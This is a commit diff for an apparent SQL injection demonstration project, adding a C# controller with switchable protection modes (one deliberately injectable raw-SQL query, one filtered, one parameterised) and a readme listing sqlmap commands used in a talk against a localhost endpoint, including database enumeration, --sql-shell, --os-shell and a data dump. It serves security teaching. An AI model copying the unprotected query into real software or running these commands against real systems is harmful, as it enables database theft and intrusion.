6b1578959d3a94b45524afb17b3bd505686e53d3
Jakub Kawa <jka@leapwork.com>
2022-08-26 16:12:13 +0200

    Presentation changes

--- Controllers/TestController.cs
+++ Controllers/TestController.cs
@@ -9,24 +9,65 @@ namespace SqlMapExample.Controllers
     {
         private readonly ILogger<TestController> _logger;
         private readonly ExampleContext _exampleContext;
+        private readonly string _protectionLevel;
 
-        public TestController(ILogger<TestController> logger, ExampleContext exampleContext)
+        public TestController(ILogger<TestController> logger, ExampleContext exampleContext, IConfiguration configuration)
         {
             _logger = logger;
             _exampleContext = exampleContext;
+            _protectionLevel = configuration["PROTECTION_LEVEL"];
         }
 
         [HttpGet(nameof(GetId))]
-        public async Task<IActionResult> GetId(string slugId, long version)
+        public async Task<IActionResult> GetId(string slugId)
         {
+            _logger.LogInformation("Running with {protectionLevel} protection mode", _protectionLevel);
+
             try
             {
-                if (slugId.Any(@char => !(char.IsLetterOrDigit(@char) || @char == '-')))
-                {
-                    throw new Exception("Hacking not allowed.");
-                }
+                var history = await GetDataWithProtectionLevel(slugId, _protectionLevel);
+                return Ok(history);
+            }
+            catch (Exception e)
+            {
+                _logger.LogError(e, "Got some error");
+                return NotFound();
+            }
+        }
 
-                var sql = @$"
+        private async Task<List<FilesHistory>> GetDataWithProtectionLevel(string slugId, string protectionLevel) =>
+            protectionLevel switch
+            {
+                "NONE" => await FilesHistoriesNoProtection(slugId),
+                "INTEGRATED" => await FilesHistoriesIntegrated(slugId),
+                "MANUAL" => await FilesHistoriesManual(slugId),
+                _ => throw new ArgumentOutOfRangeException(nameof(protectionLevel), protectionLevel, null)
+            };
+
+        private async Task<List<FilesHistory>> FilesHistoriesManual(string slugId)
+        {
+
+            if (slugId.Any(@char => !(char.IsLetterOrDigit(@char) || @char == '-')))
+            {
+                throw new Exception("Hacking not allowed.");
+            }
+
+            var sql = @$"
+                    SELECT
+                       ID,
+                       SlugId,
+                       Version
+                    FROM
+                        [History]
+                    WHERE
+                        [SlugId] = '{slugId}'";
+
+            return await _exampleContext.History.FromSqlRaw(sql).AsNoTracking().ToListAsync();
+        }
+
+        private async Task<List<FilesHistory>> FilesHistoriesNoProtection(string slugId)
+        {
+            var sql = @$"
                     SELECT
                        ID,
                        SlugId,
@@ -35,18 +76,25 @@ namespace SqlMapExample.Controllers
                         [History]
                     WHERE
                         [SlugId] = '{slugId}'
-                    AND
-                        [Version] = '{version}'
                     ";
 
-                var history = await _exampleContext.History.FromSqlRaw(sql).AsNoTracking().ToListAsync();
-                return Ok(history);
-            }
-            catch (Exception e)
-            {
-                _logger.LogError(e, "Got some error");
-                return NotFound();
-            }
+            return await _exampleContext.History.FromSqlRaw(sql).AsNoTracking().ToListAsync();
+        }
+
+        private async Task<List<FilesHistory>> FilesHistoriesIntegrated(string slugId)
+        {
+            FormattableString sql = @$"
+                    SELECT
+                       ID,
+                       SlugId,
+                       Version
+                    FROM
+                        [History]
+                    WHERE
+                        [SlugId] = '{slugId}'
+                    ";
+
+            return await _exampleContext.History.FromSqlInterpolated(sql).AsNoTracking().ToListAsync();
         }
 
         [HttpGet(nameof(EnsureDataSeed))]
--- sqlmap/readme.md
+++ sqlmap/readme.md
@@ -1,5 +1,34 @@
-﻿# Usage 
+﻿# Installation
+
+https://github.com/sqlmapproject/sqlmap/wiki/Download-and-update
+
+
+# Usage 
+
+## Exploratory way 
+```sh
+py sqlmap.py -r GetSlugIdRequest.txt -p slugId # will test only slugId param
+```
+
+
+## Explicit way
+```sh
+py sqlmap.py -u http://localhost:5003/Test/GetId?slugId=a&version=1 -p slugId
+```
+
+
+## Commands used during presentation
 
 ```sh
-sqlmap -r GetSlugIdRequest.txt -p slugId # will test only slugId param
+
+Cd C:\sqlmap\sqlmapproject-sqlmap-1.6.8
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ # AHA we have an injection! 
+# Show the injection in the swagger (copy paste the output).
+
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --is-dba # do we have a DBA? 
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ -–tables # what tables do we have in the database 
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --sql-shell # => select * from Apollo21.PackageDependencies 
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --os-shell # maybe os access? 
+py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --dump --fresh-queries # ((i want to search these data offline). Nice csv.) Passwords
+
 ```
